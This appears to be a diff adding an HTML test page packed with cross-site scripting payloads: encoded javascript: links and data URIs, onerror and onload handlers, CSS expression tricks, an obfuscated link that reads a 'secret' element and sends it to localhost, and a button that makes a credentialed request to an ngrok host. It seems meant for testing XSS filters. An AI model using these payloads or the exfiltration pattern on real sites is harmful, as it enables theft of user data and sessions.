@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+
+<head>
+	<script src="tsc.js"></script>
+	<title>Page Title</title>
+
+</head>
+
+<body>
+
+	<p name="name">This is a secret.</p>
+	<h1>This is a Heading</h1>
+	<p>This is a paragraph.</p>
+	<a href="javascript:data:text/HTML;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+">ClickMe</a>
+	<a style=<!---/**/&#61expression(write(1))/*-->2</a>
+	<img src="data:text/HTML;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+">2</a>
+	<img/src="1"/onerror="alert('XSS')">
+	<style>
+		@import url("javascript:alert(4)");
+	</style>
+	<!-- <img/\/\μ/src="x" onerror="alert(3)"> -->
+	<!-- <body onload="alert`111`"> -->
+	<a
+		href=j&#97v&#97script&#x3A;var&#32secret&#32=&#32document.getElementsByName('name')[0]&#46innerHTML;var&#32data&#32=&#32&#123body:secret,method:'POST'};fetch`http:\//localhost:3001/api/ping?secret=something$&#123data}`>ClickMeFor$</a>
+
+	<button id="b1"> click </button>
+
+	<!-- <script>&#97;&#108;&#101;&#114;&#116;&#96;&#97;&#36;&#123;&#49;&#125;&#96;</script> -->
+	<td>
+		&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#96;&#97;&#36;&#123;&#49;&#125;&#96;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+	</td>
+	<td>
+		<script>
+			<!-- new Function('alert(11)')() -->
+		</script>
+	</td>
+
+	<sCrIpT>
+		const downloadBtn = document.querySelector("#b1");
+
+		downloadBtn.addEventListener("click", async () => {
+			try {
+				console.log("Download try");
+				const response = await fetch("https://b353-217-138-216-116.ngrok-free.app/api/pong", {
+					credentials: 'include',
+					method: 'PATCH'
+				});
+				console.log("Download complete", await response.text());
+			} catch (error) {
+				console.error(`Download error: ${error.message}`);
+			}
+		});
+	</sCriPt>
+</body>
+
+</html>
